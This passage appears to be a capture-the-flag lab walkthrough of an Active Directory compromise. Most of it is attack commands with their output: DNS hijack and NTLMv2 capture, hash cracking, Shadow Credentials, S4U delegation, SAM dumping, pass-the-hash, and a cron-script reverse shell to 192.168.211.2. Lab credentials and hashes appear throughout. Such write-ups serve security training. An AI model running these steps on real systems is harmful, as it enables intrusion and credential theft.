* `installed_updates.ps1` — decoy; plain `Get-HotFix` reporting
* **`webserver_monitor.ps1`** — gold

## 13.2 webserver_monitor.ps1 — A Coercion Machine, Delivered by the Lab

```powershell
➜ cat installed_updates.ps1
# installed_updates.ps1
# Lists installed Windows updates

$OutputFile = "$env:TEMP\installed_updates.txt"

"===================================" | Out-File $OutputFile
" Installed Windows Updates" | Out-File $OutputFile -Append
" Generated: $(Get-Date)" | Out-File $OutputFile -Append
"===================================" | Out-File $OutputFile -Append
"" | Out-File $OutputFile -Append

try {
    Get-HotFix |
        Sort-Object InstalledOn -Descending |
        Select-Object HotFixID,
                      Description,
                      InstalledBy,
                      InstalledOn |
        Format-Table -AutoSize |
        Out-String |
        Out-File $OutputFile -Append

    Write-Host "Installed updates have been saved to:" -ForegroundColor Green
    Write-Host "  $OutputFile" -ForegroundColor Cyan
}
catch {
    Write-Host "Failed to retrieve installed updates." -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Yellow
}

➜ cat webserver_monitor.ps1
# webserver_monitor.ps1

# Check web server status. Scheduled to run every 1min
# Service Account: svc_webmonitor

Write-Host "Web Server Monitoring - Service Account: svc_webmonitor" -ForegroundColor Cyan

$targets = @(
    "webstatus.westbridge.hsm",
    "webportal.westbridge.hsm",
    "webmonitor.westbridge.hsm"
)

foreach ($target in $targets) {
    try {
        Write-Host "Checking: $target" -ForegroundColor Gray

        $request = Invoke-WebRequest `
            -Uri "http://$target" `
            -UseDefaultCredentials `
            -UseBasicParsing `
            -TimeoutSec 3

        if ($request.StatusCode -ne 200) {
            Write-Host "  Warning: $target returned status: $($request.StatusCode)" -ForegroundColor Yellow
        }
        else {
            Write-Host "  Status: 200 - OK" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "  Error: Failed to connect to $target" -ForegroundColor Red
    }
}

Write-Host "Monitoring completed - Service: svc_webmonitor" -ForegroundColor Cyan
```

Three facts stacked:

1. It runs **every 60 seconds**, scheduled, as **`svc_webmonitor`** — the account BloodHound
   flagged with **AddKeyCredentialLink on `svc_files`** ([Section 9.4](#non-default-acl-edges)). That was always the designed
   chain: own `svc_webmonitor` ➜ Shadow Credential on `svc_files` ➜ S4U constrained
   delegation ➜ SYSTEM-equivalent on FILES.
2. `-UseDefaultCredentials` attaches the running account's Negotiate/NTLM auth to every HTTP
   request. Whoever answers receives `svc_webmonitor`'s authentication material.
3. The three targets are **FQDNs** — so classic LLMNR/NBNS poisoning won't fire (Windows
   resolves them via DNS, no broadcast fallback). We must control what DNS says.

> **Why HTTP not HTTPS:** `-UseDefaultCredentials` over plain HTTP sends NTLMv2 in the clear — Responder captures the full challenge-response. Over HTTPS, the credentials would still be sent but encrypted inside TLS, making capture impossible without a MITM cert. The FQDNs-not-hostnames detail means LLMNR/NBT-NS poisoning won't fire; DNS is the only interception vector.

## 13.3 The Account Behind the Script — svc_webmonitor

The script header says `Service Account: svc_webmonitor`, but BloodHound's graph for the *owning* account — the one with the AddKeyCredentialLink edge that makes this whole chain worthwhile — is worth seeing now rather than waiting for Section 14. Two images, both already introduced in [Section 9.4](#non-default-acl-edges) but central enough to repeat here:

![BloodHound — svc_webmonitor outbound: AddKeyCredentialLink on svc_files + cert template enrollment](/assets/images/westbridge-bh-svcwebmonitor-outbound.png)

![BloodHound — the AddKeyCredentialLink edge](/assets/images/westbridge-bh-svcwebmonitor-addkeycred.png)

|| Edge | Target | Meaning |
|---|---|---|
| **AddKeyCredentialLink** | `svc_files` | Can append a Key Credential to svc_files's `msDS-KeyCredentialLink` — the Shadow Credentials primitive. No password needed; once the key is planted, pywhisker/certipy authenticates as svc_files via PKINIT and the NT hash drops out of the PAC. |
| **Enroll** | `User`, `ClientAuth`, `UserSignature`, `EFS` cert templates (CA01-AD-CA) | Can request a certificate from the domain CA as svc_webmonitor — the authentication artifact certipy needs to PKINIT as svc_files after planting the key. |
| MemberOf | **WEB BACKUP MAINTAINERS** | The group that justifies the account's existence on the web tier. Not directly exploitable, but explains why this account exists. |
| MemberOf | Domain Users / Authenticated Users / Everyone | Baseline. |

Two things stand out:

1. **svc_webmonitor is NOT svc_web.** The current Section 13.3 (next) shows svc_web's graph — a different account (RID 9506 vs RID 9521), with different edges. svc_web holds Enroll on the same cert templates but has *no* AddKeyCredentialLink on svc_files. The script runs as svc_webmonitor; the coercion captures svc_webmonitor's NTLM; the Shadow Credential edge belongs to svc_webmonitor. Keep the accounts straight.
2. **The AddKeyCredentialLink ➜ svc_files edge is the whole point.** Everything else in this section (DNS hijack, hash capture, crack) is prep work to unlock that one edge. Once we have svc_webmonitor's password, certipy shadow auto does the rest in one command — and svc_files's constrained delegation to FILES$ ([Section 9.3](#delegation)) turns that into SYSTEM-equivalent on the file server.

> **RID detail:** svc_webmonitor is RID 9521. svc_web is RID 9506. Both are in the 9500+ range (domain's service account band), both have "password never expires" since the domain build, and both enrolled on the same cert templates — but only svc_webmonitor holds the key-trust edge. The lab makes you tell them apart.

### 13.3.1 Why These Three FQDNs?

Returning to the script's target list with the account identity fixed:

```powershell
$targets = @(
    "webstatus.westbridge.hsm",
    "webportal.westbridge.hsm",
    "webmonitor.westbridge.hsm"
)
```

These aren't random — they're the three service FQDNs a *web monitoring* service account would plausibly check. But from an attacker's lens they're a credential coercion surface: each one, when resolved via DNS to our IP and hit by the script's `-UseDefaultCredentials` request, sends `svc_webmonitor`'s NTLMv2 to us. Three targets, one every 60 seconds, one captured hash. We only need to own one of the three DNS records; the other two are decoys for the lab's narrative.

## 13.4 Who Is svc_web?

![BloodHound — svc_web outbound control](/assets/images/westbridge-bh-svcweb-outbound.png)

![BloodHound — svc_web group memberships](/assets/images/westbridge-bh-svcweb-memberof.png)

BloodHound's picture of the account behind the monitor script (`S-1-...-9506`, password never expires since domain build):

| Edge | Meaning |
|---|---|
| MemberOf **WEB BACKUP MAINTAINERS** | backup/maintenance role on the web tier |
| Enroll rights on **User / ClientAuth / UserSignature / EFS** cert templates | AD CS enrollment as this account — ESC-hunting surface |
| Domain Users / Authenticated Users / Everyone | baseline |

No direct ACL edges to `svc_files` from `svc_web` — the AddKeyCredentialLink edge belongs to **`svc_webmonitor`** (RID 9521), a *different* account. So the play remains: capture `svc_webmonitor`'s credentials from the monitoring script's own traffic.

## The Plan — Own the Three Names

```bash
# 1) Do the names resolve today? Where do they point?
➜ for h in webstatus webportal webmonitor; do
  printf '%-12s -> ' "$h"; dig +short @10.0.10.5 $h.westbridge.hsm A
done
webstatus    -> webportal    -> webmonitor   ->
```

```bash
# Listener up
⚡ responder -I tun0 -v

➜ dnstool -u 'westbridge\r.anderson' -p 'SecretMyth123!' \
    --action add --type A \
    --record webstatus.westbridge.hsm \
    --data 192.168.211.2 \
    -dns-ip 10.0.10.5 \
    dc.westbridge.hsm
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding extra record
[+] LDAP operation completed successfully

➜ dnstool -u 'westbridge\r.anderson' -p 'SecretMyth123!' \
    --action query \
    --record webstatus.westbridge.hsm \
    -dns-ip 10.0.10.5 \
    dc.westbridge.hsm
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record webstatus
DC=webstatus,DC=westbridge.hsm,CN=MicrosoftDNS,DC=DomainDnsZones,DC=westbridge,DC=hsm
[+] Record entry:
 - Type: 1 (A) (Serial: 387)
 - Address: 192.168.211.2

➜ dig @10.0.10.5 webstatus.westbridge.hsm +noall +answer
webstatus.westbridge.hsm. 180   IN      A       192.168.211.2

➜ nslookup webstatus.westbridge.hsm 10.0.10.5
Server:         10.0.10.5
Address:        10.0.10.5#53

Name:   webstatus.westbridge.hsm
Address: 192.168.211.2

# Hash
[HTTP] Sending NTLM authentication request to 10.0.10.15
[HTTP] GET request from: ::ffff:10.0.10.15  URL: /
[HTTP] NTLMv2 Client   : 10.0.10.15
[HTTP] NTLMv2 Username : WESTBRIDGE\svc_webmonitor
[HTTP] NTLMv2 Hash     : svc_webmonitor::WESTBRIDGE:27768ca47d2e4084:DAC3B95D74A0B36878D5C1E9552D9A5A:01010000000000002D81BBF1DF32DD0173001A55CB22B19B000000000200080033004C005900450001001E00570049004E002D004C0058005400440056003600390031003300430041000400140033004C00590045002E004C004F00430041004C0003003400570049004E002D004C0058005400440056003600390031003300430041002E0033004C00590045002E004C004F00430041004C000500140033004C00590045002E004C004F00430041004C000800500050000000000000000000000000200000DBB480CC99FBF021DEB29D5B253AC00C2B6168DCA2A8E954582A1E77D8342DF35C4413DC32AF485014FC4F7E5280FB7895F394391B1A0541B4DEBA1326C2DC790A0010000000000000000000000000000000000009003A0048005400540050002F007700650062007300740061007400750073002E0077006500730074006200720069006400670065002E00680073006D000000000000000000

# Crack the Hash
➜ hashcat --identify svc_webmonitor.netntlmv2.hash
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   5600 | NetNTLMv2                                                  | Network Protocol

➜ hashcat -a 0 -m 5600 svc_webmonitor.netntlmv2.hash /opt/SecLists/rockyou.txt -d 1
hashcat (v7.1.2-382-g2d71af371) starting

SVC_WEBMONITOR::WESTBRIDGE:27768ca47d2e4084:dac3b95d74a0b36878d5c1e9552d9a5a:01010000000000002d81bbf1df32dd0173001a55cb22b19b000000000200080033004c005900450001001e00570049004e002d004c0058005400440056003600390031003300430041000400140033004c00590045002e004c004f00430041004c0003003400570049004e002d004c0058005400440056003600390031003300430041002e0033004c00590045002e004c004f00430041004c000500140033004c00590045002e004c004f00430041004c000800500050000000000000000000000000200000dbb480cc99fbf021deb29d5b253ac00c2b6168dca2a8e954582a1e77d8342df35c4413dc32af485014fc4f7e5280fb7895f394391b1a0541b4deba1326c2dc790a0010000000000000000000000000000000000009003a0048005400540050002f007700650062007300740061007400750073002e0077006500730074006200720069006400670065002e00680073006d000000000000000000:eazypassword
```

Once `svc_files` key-trust is ours: S4U2Self/S4U2Proxy through its AllowedToDelegate➜FILES$ edge = any-user access to the file server.


# 14. The Chain Ahead — svc_webmonitor ➜ svc_files ➜ FILES$

With `svc_webmonitor : eazypassword` cracked, the two BloodHound edges we've been carrying since [Section 9.4](#non-default-acl-edges) finally connect into one path. Let's read them properly:

## 14.1 Edge #1 — AddKeyCredentialLink

![BloodHound — svc_webmonitor outbound: AddKeyCredentialLink on svc_files + cert template enrollment](/assets/images/westbridge-bh-svcwebmonitor-outbound.png)

`svc_webmonitor` holds **AddKeyCredentialLink over `svc_files`** — the exact primitive behind **Shadow Credentials**. What that means mechanically:

* Every AD account can authenticate with a certificate via *Key Trust* — the public half of
  the key lives in the account's `msDS-KeyCredentialLink` attribute (its "Key Credentials").
* Anyone with **write access to that attribute** can append their **own** key credential.
* From then on, they can Kerberos-PKINIT **as that account** using their own private key.
  No password ever touched, nothing overwritten, fully offline after the initial write.

The same screenshot shows the second gift: `svc_webmonitor` can also **Enroll** on the `User`, `ClientAuth`, `UserSignature`, and `EFS` cert templates under `CA01-AD-CA`. That's our source of a valid authentication certificate once pywhisker plants the key credential — no need for any other CA access.

Zoomed on the edge itself:

![BloodHound — the AddKeyCredentialLink edge](/assets/images/westbridge-bh-svcwebmonitor-addkeycred.png)

## 14.2 Edge #2 — Constrained Delegation to FILES$

![BloodHound — svc_files AllowedToDelegate to FILES / FILES.WESTBRIDGE.HSM](/assets/images/westbridge-bh-svcfiles-delegate.png)

`svc_files` is **Trusted for Kerberos Constrained Delegation**, with its SPN list pointing at `FILES` / `FILES.WESTBRIDGE.HSM`. Delegation semantics:

* A principal trusted for delegation may obtain service tickets **on behalf of any other
  user** to the services in its `msDS-AllowedToDelegateTo` list.
* With **protocol transition** (`TrustedToAuth`), it doesn't even need the user's ticket —
  it asks the KDC for a special S4U2Self ticket "as" anyone, then chains it (S4U2Proxy)
  toward the target service.
* Practically: whoever controls `svc_files`'s identity can present themselves to FILES as
  **Domain Admin if they feel like it**.

## 14.3 Composing the chain

```
svc_webmonitor : eazypassword          (captured via DNS-hijack coercion)
        │  1. certipy: use svc_webmonitor to write a Key Credential onto svc_files
        ▼
control of svc_files's Kerberos identity   (password still unknown — irrelevant)
        │  2. getST.py -impersonate administrator -spn cifs/FILES.westbridge.hsm
        ▼
S4U2Self + S4U2Proxy ticket as Administrator@WESTBRIDGE.HSM ➜ cifs/FILES$
        │  3. use the ticket against FILES
        ▼
FILES.westbridge.hsm — including IT-Share ("Administrators Only")
```

## 14.4 Execution — Shadow Credentials + S4U + Pass-the-Hash

First, confirm the cracked account is live domain-wide:

```bash
➜ nxc smb 10.0.10.0/24 \
    -u 'svc_webmonitor' -p 'eazypassword'
SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\svc_webmonitor:eazypassword
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\svc_webmonitor:eazypassword

➜ nxc ldap dc.westbridge.hsm \
    -u 'svc_webmonitor' -p 'eazypassword' \
    --trusted-for-delegation
LDAP        10.0.10.5       389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:westbridge.hsm) (signing:None) (channel binding:When Supported)
LDAP        10.0.10.5       389    DC               [+] westbridge.hsm\svc_webmonitor:eazypassword
LDAP        10.0.10.5       389    DC               DC$
```

**Step 1 — plant the shadow credential.** Certipy's `shadow auto` does the whole loop: generate a key pair + DeviceID ➜ append it to `svc_files`'s `msDS-KeyCredentialLink` (exercising our AddKeyCredentialLink right) ➜ PKINIT-authenticate as `svc_files` using the new cert ➜ fetch a TGT ➜ then read the account's NT hash out of the PAC *inside that TGT* (a bonus of Key Trust logons) ➜ finally restore the original attribute, leaving no visible key residue:

```bash
➜ certipy shadow auto \
    -u 'svc_webmonitor@westbridge.hsm' -p 'eazypassword' \
    -account svc_files \
    -target westbridge.hsm -dc-host dc.westbridge.hsm -dc-ip 10.0.10.5
[*] Adding Key Credential ... to the Key Credentials for 'svc_files'
[*] Got TGT
[*] Trying to retrieve NT hash for 'svc_files'
[*] Restoring the old Key Credentials for 'svc_files'
[*] NT hash for 'svc_files': 0eb58f71ee3cd38f9e695b3270596a9f
```

We never learned svc_files's password — and we didn't need to. We now hold both its **ccache** and its **NT hash**.

**Step 2 — delegate as Administrator toward FILES.** Using the svc_files ccache, S4U2Self asks the KDC for a ticket "as Administrator" (no password check — that's the delegation trust), then S4U2Proxy chains it onto `HOST/FILES.westbridge.hsm`:

```bash
➜ certipy shadow auto \
    -u 'svc_webmonitor@westbridge.hsm' -p 'eazypassword' \
    -account svc_files \
    -target westbridge.hsm -dc-host dc.westbridge.hsm -dc-ip 10.0.10.5
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'svc_files'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '968f8ccc5ef84910baf6ffbd97bcd7c7'
[*] Adding Key Credential with device ID '968f8ccc5ef84910baf6ffbd97bcd7c7' to the Key Credentials for 'svc_files'
[*] Successfully added Key Credential with device ID '968f8ccc5ef84910baf6ffbd97bcd7c7' to the Key Credentials for 'svc_files'
[*] Authenticating as 'svc_files' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'svc_files@westbridge.hsm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'svc_files.ccache'
[*] Wrote credential cache to 'svc_files.ccache'
[*] Trying to retrieve NT hash for 'svc_files'
[*] Restoring the old Key Credentials for 'svc_files'
[*] Successfully restored the old Key Credentials for 'svc_files'
[*] NT hash for 'svc_files': 0eb58f71ee3cd38f9e695b3270596a9f
```

**Step 3 — prove it and cash out.** The forged-administrator ticket against SMB:

```bash
➜ klist Administrator@HOST_FILES.westbridge.hsm@WESTBRIDGE.HSM.ccache
Ticket cache: FILE:Administrator@HOST_FILES.westbridge.hsm@WESTBRIDGE.HSM.ccache
Default principal: Administrator@westbridge.hsm

Valid starting       Expires              Service principal
08/28/2026 23:52:00  08/29/2026 09:51:24  HOST/FILES.westbridge.hsm@WESTBRIDGE.HSM
        renew until 08/29/2026 23:51:23

➜ env KRB5CCNAME=Administrator@HOST_FILES.westbridge.hsm@WESTBRIDGE.HSM.ccache \
nxc smb files.westbridge.hsm -k --use-kcache
SMB         files.westbridge.hsm 445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         files.westbridge.hsm 445    FILES            [+] westbridge.hsm\Administrator from ccache (Pwn3d!)

➜ env KRB5CCNAME=Administrator@HOST_FILES.westbridge.hsm@WESTBRIDGE.HSM.ccache \
nxc smb files.westbridge.hsm -k --use-kcache --sam
SMB         files.westbridge.hsm 445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         files.westbridge.hsm 445    FILES            [+] westbridge.hsm\Administrator from ccache (Pwn3d!)
SMB         files.westbridge.hsm 445    FILES            [*] Dumping SAM hashes
SMB         files.westbridge.hsm 445    FILES            Administrator:500:aad3b435b51404eeaad3b435b51404ee:fa2f058969c315b0fcae96ed6ec268fb:::
SMB         files.westbridge.hsm 445    FILES            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         files.westbridge.hsm 445    FILES            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         files.westbridge.hsm 445    FILES            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
SMB         files.westbridge.hsm 445    FILES            [+] Added 4 SAM hashes to the database
```

`(Pwn3d!)` — and a local Administrator hash to keep. Pass-the-hash into WinRM for an interactive shell:

```bash
➜ evil_winrmexec \
    westbridge.hsm/administrator@files.westbridge.hsm \
    -hashes ':fa2f058969c315b0fcae96ed6ec268fb'

PS C:\Users\Administrator\Documents> whoami; hostname
files\administrator
FILES

PS > type ..\Desktop\*
Flag02[FILE_S3rver_0wned]
```

**Flag 2 captured.** Two hosts down (SQL = SYSTEM, FILES = local Admin), and the technique stack is now fully proven end-to-end: *web foothold ➜ LDAP dump ➜ Kerberos abuse ➜ silver ticket ➜ DB backup creds ➜ OU ACL abuse ➜ DNS coercion ➜ shadow credentials ➜ delegation.*

# 15. WEB — Flag03, Two Different Ways

## 15.1 The SSH Key Sitting in the Backup

With local admin on FILES, `C:\` itself is browsable — and `C:\IT-Share` (the "Administrators Only" share) finally opens:

```bash
PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/12/2025  11:02 AM                inetpub
d-----         7/15/2026   5:13 PM                IT-Share
d-----          4/1/2024   7:02 AM                PerfLogs
d-r---        11/14/2024   1:26 AM                Program Files
d-r---          4/1/2024   8:16 AM                Program Files (x86)
d-----          7/7/2026   2:49 PM                Scripts
d-----          7/7/2026   7:32 PM                Students
d-r---         7/12/2026  12:10 PM                Users
d-----         8/22/2026   8:20 PM                Windows
-a----          7/4/2026   8:04 AM          12288 DumpStack.log


PS C:\> dir IT-Share


    Directory: C:\IT-Share


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          7/4/2026   9:56 AM                Backup
d-----          7/7/2026   3:08 PM                Deployment
d-----          7/7/2026   9:09 PM                Documentation


PS C:\> tree IT-Share /a /f
Folder PATH listing for volume Windows
Volume serial number is 7EC2-1A39
C:\IT-SHARE
+---Backup
|   \---WEB
|       |   id_ed25519
|       |   id_ed25519.pub
|       |
|       \---www
|           \---html
|                   academics.html
|                   background.png
|                   campus.html
|                   campus_map.png
|                   index.html
|                   library.html
|                   programs.html
|
+---Deployment
|       7z2602-x64.msi
|       ntrights.exe
|       SQL2019-SSEI-Expr.exe
|       vlc-3.0.23-win32.exe
|
\---Documentation
        Cybersecurity_Guidelines_2026.pdf
        NetworkTopology.png
        Password_Policy.txt
```

```bash
PS C:\IT-Share\Backup\WEB> !download id_ed25519
downloading C:\IT-Share\Backup\WEB\id_ed25519
done, writing to /home/kaladin/CTF/HackSmarter/Ranges/WestbridgeUniversity/www/id_ed25519

PS C:\IT-Share\Backup\WEB> !download id_ed25519.pub
downloading C:\IT-Share\Backup\WEB\id_ed25519.pub
done, writing to /home/kaladin/CTF/HackSmarter/Ranges/WestbridgeUniversity/www/id_ed25519.pub
```

```
C:\IT-Share
├── Backup\WEB\  id_ed25519  +  id_ed25519.pub   🡐 an SSH PRIVATE KEY
├── Deployment\  (installers)
└── Documentation\  (Password_Policy.txt, NetworkTopology.png, ...)
```

Someone backed up the web server's content — *including its SSH keypair* — to the file server. Download both:

```
PS > !download id_ed25519
```

## 15.2 Shell as svc_web — and the SSSD Username Quirk

First SSH attempts fail — the trick is how SSSD on this box expects the name (`use_fully_qualified_names = True`):

```bash
➜ chmod 600 id_ed25519 id_ed25519.pub

➜ ssh -i id_ed25519 svc_web@web.westbridge.hsm
Warning: Permanently added 'web.westbridge.hsm' (ED25519) to the list of known hosts.
svc_web@web.westbridge.hsm: Permission denied (publickey).

➜ ssh -i id_ed25519 "svc_web@westbridge.hsm"@10.0.10.10
Warning: Permanently added '10.0.10.10' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 7.0.0-1010-aws x86_64)

Last login: Sun Aug 23 09:48:43 2026 from 10.0.30.4

svc_web@westbridge.hsm@web:~$ whoami && id
svc_web@westbridge.hsm
uid=337209506(svc_web@westbridge.hsm) gid=337200513(domain users@westbridge.hsm) groups=337200513(domain users@westbridge.hsm),337209505(web backup maintainers@westbridge.hsm)

svc_web@westbridge.hsm@web:~$ hostname
web.westbridge.hsm
```

## 15.3 Unintended Way — Kerberos as the Privilege Escalation

![BloodHound — m.thompson GenericAll over the STUDENTS OU](/assets/images/westbridge-bh-mthompson-genericall-students.png)

Ref: [Section 9.4](#94-non-default-acl-edges)

The second path is the elegant one, and it's pure AD-on-Linux. m.thompson still holds GenericAll over the Students OU — which means **creating brand-new domain users** in it:

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u m.thompson -p 'Pa$$w0rd' \
    add user root 'SecretMyth123!' \
    --ou 'OU=Students,DC=westbridge,DC=hsm'
[+] root created
```

Now, from the *unprivileged* d.reynolds shell on WEB — no sudo involved:

```bash
svc_web@westbridge.hsm@web:~$ kinit root@WESTBRIDGE.HSM
Password for root@WESTBRIDGE.HSM:
Warning: Your password will expire in less than one hour on Tue Sep 14 02:48:05 2100

svc_web@westbridge.hsm@web:~$ ksu root -n root@WESTBRIDGE.HSM
Authenticated root@WESTBRIDGE.HSM
Account root: authorization for root@WESTBRIDGE.HSM successful
Changing uid to root (0)

root@web:/home/svc_web@westbridge.hsm# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)

root@web:/home/svc_web@westbridge.hsm# ls /root
flag.txt  snap

root@web:/home/svc_web@westbridge.hsm# cat /root/flag.txt
Flag03[WEB_0wned_via_Backup]
```

Why this works: the box is domain-joined with SSSD, and `ksu` authorizes a Kerberos principal against a **local account of the same name**. We manufactured `root@WESTBRIDGE.HSM` in AD — the local `root` account completed the mapping. **Domain-side identity creation became local root on a Linux member.** Same flag, completely different lesson: on domain-joined Linux, *who exists in AD* is a privilege-escalation primitive.

## 15.4 Unintended Way

**The web box, as the account whose group owns the backup script.** On-box recon finds:

```bash
svc_web@westbridge.hsm@web:~$ ps -eo user,pid,cmd | grep -i web
root        2295 sshd: svc_web@westbridge.hsm [priv]
svc_web+    2302 /usr/lib/systemd/systemd --user
svc_web+    2303 (sd-pam)
svc_web+    2359 sshd: svc_web@westbridge.hsm@pts/0
svc_web+    2360 -bash
svc_web+    2617 bash linpeas.sh
root        2809 sshd: svc_web@westbridge.hsm [priv]
svc_web+    2902 sshd: svc_web@westbridge.hsm@pts/1
svc_web+    2903 -bash
svc_web+   41234 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
svc_web+   42768 bash linpeas.sh
svc_web+   42769 timeout 1 sh -c echo id | newgrp "systemd-journal"
svc_web+   42770 sh -c echo id | newgrp "systemd-journal"
svc_web+   42773 ps -eo user,pid,cmd
svc_web+   42774 grep -i web

svc_web@westbridge.hsm@web:~$ find / -group "web backup maintainers@westbridge.hsm" 2>/dev/null | grep -Ev '^/(run|sys|proc|home)'
/var/backups/web
/opt/web_backup/web_backup.sh

svc_web@westbridge.hsm@web:~$ cat /opt/web_backup/web_backup.sh
#!/bin/bash
set -euo pipefail

SRC="/var/www/html"
DEST="/var/backups/web"
BACKUP="${DEST}/web_latest.tar.gz"

mkdir -p "$DEST"

tar -czf "$BACKUP" -C "$SRC" .

chmod 640 "$BACKUP"

svc_web@westbridge.hsm@web:~$ ls -la /opt/web_backup/web_backup.sh
-rwxrwxr-x+ 1 root web backup maintainers@westbridge.hsm 181 Jul 28 20:17 /opt/web_backup/web_backup.sh
```

A cron-driven backup script, **group-writable by svc_web's own group**, and it runs as someone else (the file owner is root, the cron context isn't svc_web — the shell that arrives next proves who):

## 15.4 Cron Hijack ➜ e.mitchell

One false start worth documenting: the first injection used `sed -i '1i ...'` — which puts the reverse shell *above* the `#!/bin/bash` shebang. The shebang stops being a shebang on line 2, so the cron run can't execute the script at all. Remove it, then append *after* line one instead:

```bash

# Start the listener
➜ penelope -p 8284

svc_web@westbridge.hsm@web:~$ sed -i '1a (bash -i >& /dev/tcp/192.168.211.2/8284 0>&1) &' /opt/web_backup/web_backup.sh

svc_web@westbridge.hsm@web:~$ cat /opt/web_backup/web_backup.sh
#!/bin/bash
(bash -i >& /dev/tcp/192.168.211.2/8284 0>&1) &
set -euo pipefail
...[snip]...

# Shell
e.mitchell@web:~$ whoami && id
e.mitchell
uid=1001(e.mitchell) gid=1001(e.mitchell) groups=1001(e.mitchell),1002(studentportaladmins)

# Remove shell from cron
svc_web@westbridge.hsm@web:~$ sed -i '2d' /opt/web_backup/web_backup.sh
svc_web@westbridge.hsm@web:~$ head -n 3 /opt/web_backup/web_backup.sh
#!/bin/bash
set -euo pipefail
### may crash webserver..
```

Next run, the callback lands — as a user we've never seen anywhere in the domain dump:

```
e.mitchell@web:~$ hostname
web.westbridge.hsm
```

(Clean-up immediately: `sed -i '2d'` — the injected line is gone before anyone looks.)

## 15.5 — users.json ➜ d.reynolds ➜ sudo ➜ root

e.mitchell can read the student portal's user store:

```bash

e.mitchell@web:~$ ls -lR /var/www/data
/var/www/data:
total 4
drwxr-s--- 2 www-data studentportaladmins 4096 Jul 27 18:17 studentportal

/var/www/data/studentportal:
total 16
-rw-r--r-- 1 www-data www-data 12890 Jul 27 18:17 users.json
```

```bash
e.mitchell@web:~$ cat /var/www/data/studentportal/users.json
{
    "d.reynolds@westbridge.hsm": {
        "fullName": "d.reynolds",
        "email": "d.reynolds@westbridge.hsm",
        "studentId": "WB-2026-999",
        "program": "Business \r\n                        Administration",
        "password": "$2y$10$mRCQxe\/f5AEhuyi1sZKoyuOCfUeAroZ\/dDhOgrUcrGCRxqRpfnRRi",
        "registeredAt": "2026-07-27T16:11:26+00:00",
        "status": "Active",
        "accountType": "Staff,Administrators",
        "courses": [
...[snip]...
# bcrypt hashes for: d.reynolds (Staff,Administrators), e.mitchell,
#                     n.brooks, l.reed, l.cole  (all Students)

e.mitchell@web:~$ python3 -c "import json; d=json.load(open('/var/www/data/studentportal/users.json')); [print(k, v['fullName'], v['accountType'], v['password'], sep='\t') for k,v in d.items()]"
d.reynolds@westbridge.hsm       d.reynolds      Staff,Administrators    $2y$10$mRCQxe/f5AEhuyi1sZKoyuOCfUeAroZ/dDhOgrUcrGCRxqRpfnRRi
n.brooks@westbridge.hsm n.brooks        Student $2y$10$8wNlBZIztDGBJztJhBPa/uEV840u0jYjDxF7zH0BJ3HRlzbKrcZjW
l.reed@westbridge.hsm   l.reed  Student $2y$10$RGQ0z9GX.ZcrGHkGlgf9XOlc.ubkqbpx1l.D7s0.4ArqcRSQ/Eu2C
l.cole@westbridge.hsm   l.cole  Student $2y$10$zTzuHd4RAdqEkm6.NvaXi.mDvBc29DSMItP8kZWi868H3iUDbAC7.
e.mitchell@westbridge.hsm       e.mitchell      Staff,Administrators    $2y$10$QCVYL2rECuJ2uVYAKMg06uO3iChZBKEznAtD.ngTECjIfdBdNQT6a

➜ hashcat --identify /tmp/hash.txt
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System


➜ hashcat -a 0 -m 3200 /tmp/hash.txt /opt/SecLists/rockyou.txt -d 1
...[snip]...
Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$mRCQxe/f5AEhuyi1sZKoyuOCfUeAroZ/dDhOgrUcrGCR...pfnRRi
...[snip]...
$2y$10$mRCQxe/f5AEhuyi1sZKoyuOCfUeAroZ/dDhOgrUcrGCRxqRpfnRRi:Password123
```

The `accountType` field is the triage key — crack the **Staff** entries first; students are noise for privilege purposes.

`d.reynolds` — flagged **Staff,Administrators** in the portal, and on the Linux side:

```bash
e.mitchell@web:~$ su - d.reynolds
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

d.reynolds@web:~$ whoami && id
d.reynolds
uid=1002(d.reynolds) gid=1003(d.reynolds) groups=1003(d.reynolds),27(sudo),1004(linuxadmins)

d.reynolds@web:~$ sudo -l
[sudo] password for d.reynolds:
Matching Defaults entries for d.reynolds on web:
